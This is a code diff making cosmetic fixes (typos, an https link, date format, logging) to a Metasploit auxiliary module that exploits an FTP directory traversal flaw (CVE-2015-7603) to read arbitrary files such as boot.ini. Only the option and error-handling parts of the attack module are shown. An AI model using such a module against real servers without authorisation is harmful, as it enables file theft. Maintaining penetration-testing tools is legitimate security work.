@@ -29,15 +29,15 @@ class MetasploitModule < Msf::Auxiliary
         [
           [ 'EDB', '38260'],
           [ 'CVE', '2015-7603'],
-          [ 'URL', 'http://shinnai.altervista.org/exploits/SH-0024-20150922.html']
+          [ 'URL', 'https://shinnai.altervista.org/exploits/SH-0024-20150922.html']
         ],
-      'DisclosureDate' => 'Sep 22 2015'
+      'DisclosureDate' => '2015-09-22'
     ))
 
     register_options(
       [
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 32 ]),
-        OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'boot.ini'])
+        OptString.new('PATH', [ true, "Path to the file to disclose, relative to the root dir.", 'boot.ini'])
       ])
   end
 
@@ -60,7 +60,7 @@ class MetasploitModule < Msf::Auxiliary
       connect_login
       sock = data_connect
       if sock.nil?
-        error_msg = __FILE__ <<'::'<< __method__.to_s << ':' << 'data_connect failed; posssible invalid response'
+        error_msg = __FILE__ <<'::'<< __method__.to_s << ':' << 'data_connect failed; possible invalid response'
         print_status(error_msg)
         elog(error_msg)
       else
@@ -74,7 +74,7 @@ class MetasploitModule < Msf::Auxiliary
         # read the file data from the socket that we opened
         # dont assume theres still a sock to read from. Per #7582
         if sock.nil?
-          error_msg = __FILE__ <<'::'<< __method__.to_s << ':' << 'data_connect failed; posssible invalid response'
+          error_msg = __FILE__ <<'::'<< __method__.to_s << ':' << 'data_connect failed; possible invalid response'
           print_status(error_msg)
           elog(error_msg)
           return
@@ -102,10 +102,10 @@ class MetasploitModule < Msf::Auxiliary
 
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
       vprint_error(e.message)
-      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
+      elog(e)
     rescue ::Timeout::Error, ::Errno::EPIPE => e
       vprint_error(e.message)
-      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
+      elog(e)
     ensure
       data_disconnect
       disconnect
